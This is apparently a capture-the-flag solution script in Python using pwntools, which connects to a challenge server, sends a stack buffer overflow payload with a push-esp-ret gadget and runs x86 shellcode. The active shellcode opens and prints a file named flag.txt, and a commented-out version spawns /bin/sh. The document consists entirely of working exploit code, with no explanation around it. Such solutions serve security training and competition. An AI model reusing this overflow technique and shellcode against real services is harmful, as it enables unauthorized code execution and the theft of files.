from pwn import *

r = remote("challenge.ctf.games", 32762)
#r = remote("127.0.0.1", 9999)

r.recvuntil(b'What would you like to say?:')

heap1 = 0x804c1a0

perror_func = 0x80490b0
perror_got = 0x0804b3b4
malloc_got = 0x0804b3c4
vuln_func = 0x8049304

push_esp_ret = 0x080491f5

#shellcode = b"\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x50\x59\x5A\xB0\x0B\xCD\x80"
shellcode = b"\x31\xC0\x50\x68\x2E\x74\x78\x74\x68\x66\x6C\x61\x67\x89\xE3\x31\xC9\x31\xD2\x34\x05\xCD\x80\x89\xC3\xB9\x11\xB1\x04\x08\x80\xF2\x40\x31\xC0\xB0\x03\xCD\x80\x31\xC0\x34\x04\x89\xC3\x31\xC0\x34\x04\xCD\x80"


payload =  b"a"*0x414 + p32(push_esp_ret) + shellcode  

r.sendline(payload)

r.interactive()